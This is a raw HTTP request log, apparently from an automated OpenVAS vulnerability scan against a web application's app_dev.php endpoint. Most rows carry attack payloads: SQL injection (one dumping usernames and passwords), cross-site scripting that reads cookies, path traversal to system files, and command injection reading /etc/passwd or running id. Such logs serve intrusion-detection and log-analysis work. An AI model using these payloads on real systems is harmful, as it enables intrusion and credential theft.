ad50ae,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/edlink.php?linkid=-1%27%20union%20all%20select%201%2C2%2C3%2C4%2C0x53514c2d496e6a656374696f6e2d54657374%27--,1541184167,
0a03e5,5.0.96.151,GET,"http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login.php/""onmouseover=alert(""openvas-xss-test"")>",1541184169,09bf80
09bf80,5.0.96.151,GET,"http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login.php/""onmouseover=alert(""openvas-xss-test"")>",1541184169,
b3dae1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/wiki.php/<script>foo</script>,1541184169,aa7b08
aa7b08,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/wiki.php/<script>foo</script>,1541184169,
cf5b75,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/moderation.php,1541184175,02feb7
02feb7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/moderation.php,1541184175,
081b5f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/comments.php?image_id=1%27,1541184179,f87565
f87565,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/comments.php?image_id=1%27,1541184179,
7b3f36,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/viewforum.php?id=-1%27%20UNION%20ALL%20SELECT%201%2C2%2CGROUP_CONCAT%28CONCAT%28username%2C%200x3a%2C%20password%2C0x3a%2Cid%2C0x3a%2Clast_login%29%29%2C4%2C5%2C6%2C7%2C8%20FROM%20celer_users%23,1541184179,5c6545
5c6545,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/viewforum.php?id=-1%27%20UNION%20ALL%20SELECT%201%2C2%2CGROUP_CONCAT%28CONCAT%28username%2C%200x3a%2C%20password%2C0x3a%2Cid%2C0x3a%2Clast_login%29%29%2C4%2C5%2C6%2C7%2C8%20FROM%20celer_users%23,1541184180,
8a7390,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.cfm,1541184180,92bfa9
92bfa9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.cfm,1541184181,
4c5274,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/profil.php?id=1%20%3Cscript%3Efoo%3C%2Fscript%3E,1541184190,837680
837680,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/profil.php?id=1%20%3Cscript%3Efoo%3C%2Fscript%3E,1541184191,
930ea5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/portal/login.php?message=XSS%20Catched%20%21%22%29%29%3C%2Fscript%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184191,9a304c
9a304c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/portal/login.php?message=XSS%20Catched%20%21%22%29%29%3C%2Fscript%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184191,
d5c20f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184196,ee45cf
ee45cf,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184196,
e08161,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184198,a5e6dd
a5e6dd,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184199,
9cb67d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin_login.html,1541184201,1bf477
1bf477,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin_login.html,1541184202,
8da080,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184204,d8f46a
8408c9,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184204,dc3fb4
d8f46a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/module/forum/main.php?website=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184204,
dc3fb4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184204,
d4055a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184208,6ae67e
6ae67e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184208,
c41d8b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184208,3dacd5
3dacd5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184208,
bb754b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184212,ee235b
ee235b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184212,
a4960b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184212,b73bbd
b73bbd,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.cgi?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184212,
bcb391,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184217,67797e
67797e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?lng=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184217,
c9eff7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184217,dac5d4
dac5d4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184217,
c33e8d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/left.php,1541184217,1a5a2f
1a5a2f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/left.php,1541184217,
60db86,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184222,85db6f
be2310,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/report.php?img_id=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184222,8d5963
8d5963,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/report.php?img_id=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3C%2Fscript%3E,1541184222,
85db6f,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184222,
765c48,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184225,bf58e1
bf58e1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/r.pl?FILE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%3FFILE%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini,1541184226,
5f59f7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/password_reminder.php,1541184227,740edf
740edf,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/password_reminder.php,1541184228,
9f7585,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/awstatstotals.php,1541184231,3cb8aa
3cb8aa,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/awstatstotals.php,1541184232,
504965,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/read_body.php?mailbox=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&show_more=0&startMessage=1,1541184238,c76c03
c76c03,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/read_body.php?mailbox=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&show_more=0&startMessage=1,1541184238,
e9c7da,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/system,1541184239,43c8b6
43c8b6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/system,1541184239,
72d62e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/chat/send.php?css=%3Cscript%3Ealert%28gbn-vt1997382901%29%3C%2Fscript%3E,1541184247,32e36e
32e36e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/chat/send.php?css=%3Cscript%3Ealert%28gbn-vt1997382901%29%3C%2Fscript%3E,1541184248,
baae62,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/src/main.php,1541184248,4190bc
4190bc,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/src/main.php,1541184249,
17f8e1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/themes/default/header.inc.php?theme_dir=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3B%3C%2Fscript%3E,1541184251,6234ec
6234ec,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/themes/default/header.inc.php?theme_dir=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3B%3C%2Fscript%3E,1541184251,
97c443,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/cm/newui/wiki/index.jsp,1541184251,bccdf5
bccdf5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/cm/newui/wiki/index.jsp,1541184251,
f2ffeb,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/src/index.php,1541184258,167594
167594,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/src/index.php,1541184258,
3bf7d2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/admin.php,1541184258,6d8138
6d8138,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/admin.php,1541184258,
e93489,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/webcart.cgi?CHANGE=YES&CODE=PHOLD&CONFIG=mountain&NEXTPAGE=%3Bid%7C,1541184261,00d121
00d121,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/webcart.cgi?CHANGE=YES&CODE=PHOLD&CONFIG=mountain&NEXTPAGE=%3Bid%7C,1541184261,
2cca1b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/applicationengine/,1541184263,6d3ff2
6d3ff2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/applicationengine/,1541184263,
792065,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ApplicationEngine/,1541184266,abb841
abb841,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/ApplicationEngine/,1541184266,
f7dbd0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?_a=knowledgebase&_j=search&searchm=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184269,b57bc7
b57bc7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?_a=knowledgebase&_j=search&searchm=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,1541184270,
fc90cf,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/nameko.php,1541184270,b58c46
b58c46,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/nameko.php,1541184270,
ddb49b,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/photo/templates/admin_default/confirm.tpl.php?nsextt=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3B%3C%2Fscript%3E,1541184273,bdef42
bdef42,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/photo/templates/admin_default/confirm.tpl.php?nsextt=%22%3E%3Cscript%3Ealert%28%2Fopenvas-xss-test%2F%29%3B%3C%2Fscript%3E,1541184273,
8cd7de,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/research_display.php?ID=-null%20UNiON%20ALL%20SELECT%20null%2Cnull%2Cnull%2C0x53514c2d496e6a656374696f6e2d54657374%2Cnull%2Cnull%2Cnull,1541184278,b83792
b83792,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/research_display.php?ID=-null%20UNiON%20ALL%20SELECT%20null%2Cnull%2Cnull%2C0x53514c2d496e6a656374696f6e2d54657374%2Cnull%2Cnull%2Cnull,1541184279,
4f2bf2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/php-ping.php?count=1%20%26%20cat%20%2Fetc%2Fpasswd%20%26&submit=Ping%21,1541184283,d916a6
d916a6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/php-ping.php?count=1%20%26%20cat%20%2Fetc%2Fpasswd%20%26&submit=Ping%21,1541184283,
d35da1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/gzip_loader.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184283,4f63ee
4f63ee,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/gzip_loader.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini,1541184284,
18dcb0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fwindows%2Fwin.ini,1541184287,a7b05a
a7b05a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fwindows%2Fwin.ini,1541184287,
7b8cf4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/gzip_loader.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184287,6d4b64
6d4b64,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/gzip_loader.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini,1541184287,
5f9ee1,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fboot.ini,1541184290,69aa1c
69aa1c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fboot.ini,1541184290,
46e7e6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fwinnt%2Fwin.ini,1541184293,222c6c
222c6c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mylog.html?screen=%2Fwinnt%2Fwin.ini,1541184293,
668495,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fwindows%2Fwin.ini,1541184295,947d6e
947d6e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fwindows%2Fwin.ini,1541184295,
364fd0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fboot.ini,1541184297,779213
779213,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fboot.ini,1541184297,
aadee4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fwinnt%2Fwin.ini,1541184298,883cf3
883cf3,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/mlog.html?screen=%2Fwinnt%2Fwin.ini,1541184299,
17f651,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184311,2aadd7
2aadd7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00,1541184311,
f1f96a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184313,9b77a8
9b77a8,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00,1541184313,
68393d,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184315,a66a3a
a66a3a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index.php?typefilter=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwinnt%2Fwin.ini%00,1541184315,
e9d219,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/backend.php,1541184320,d4c7b1
d4c7b1,5.0.96.151,POST,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/backend.php,1541184320,
8169ae,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/wiki.php,1541184322,2078f0
2078f0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/wiki.php,1541184322,
1ad5c0,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fwindows%2Fwin.ini,1541184325,1ad595
1ad595,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fwindows%2Fwin.ini,1541184325,
88c828,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fboot.ini,1541184329,496e5a
496e5a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fboot.ini,1541184329,
453366,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fwinnt%2Fwin.ini,1541184332,f2555e
f2555e,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/sublink.php?langval=%2Fwinnt%2Fwin.ini,1541184332,
552730,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/easymsgb.pl?print=%7Cid%7C,1541184333,2d38d7
2d38d7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/easymsgb.pl?print=%7Cid%7C,1541184333,
7fbd13,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fwindows%2Fwin.ini,1541184335,e5e88a
e5e88a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fwindows%2Fwin.ini,1541184336,
22d6d3,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/forum.php?forum=-1%20UNION%20SELECT%20null%2C123456%2Cnull%2Cnull%2Cnull%2Cnull%2F%2A,1541184339,4f6da4
4f6da4,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/forum.php?forum=-1%20UNION%20SELECT%20null%2C123456%2Cnull%2Cnull%2Cnull%2Cnull%2F%2A,1541184340,
c556b5,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fboot.ini,1541184340,39fca7
39fca7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fboot.ini,1541184340,
e93564,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fwinnt%2Fwin.ini,1541184342,113af2
113af2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/core/editor.php?editor_insert_bottom=%2Fwinnt%2Fwin.ini,1541184342,
86a43a,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login.php,1541184352,54a183
54a183,5.0.96.151,POST,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/admin/login.php,1541184352,
3ef07c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index2.php?_SERVER%5BREMOTE_ADDR%5D=%27.system%28%27id%27%29.exit%28%29.%27&_SERVER%5B%5D=&module%5Bmodule%5D=1&option=wrapper,1541184355,53b7b7
53b7b7,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/index2.php?_SERVER%5BREMOTE_ADDR%5D=%27.system%28%27id%27%29.exit%28%29.%27&_SERVER%5B%5D=&module%5Bmodule%5D=1&option=wrapper,1541184355,
412927,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/view_user.php?letter=&list=1&sort_by=%27select,1541184364,577b17
577b17,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/view_user.php?letter=&list=1&sort_by=%27select,1541184364,
7836fa,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/nqt.php?portNum=foobar%3Cscript%3Efoo%3C%2Fscript%3E&queryType=all&target=127.0.0.1,1541184364,a1e21c
a1e21c,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/nqt.php?portNum=foobar%3Cscript%3Efoo%3C%2Fscript%3E&queryType=all&target=127.0.0.1,1541184365,
b4a9f6,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fwindows%2Fwin.ini%00,1541184369,20f2f2
20f2f2,5.0.96.151,GET,http://5.35.1.252:8080/ABM_Estadisticas/web/app_dev.php/Poll_It_SSI_v2.0.cgi?data_dir=%2Fwindows%2Fwin.ini%00,1541184369,
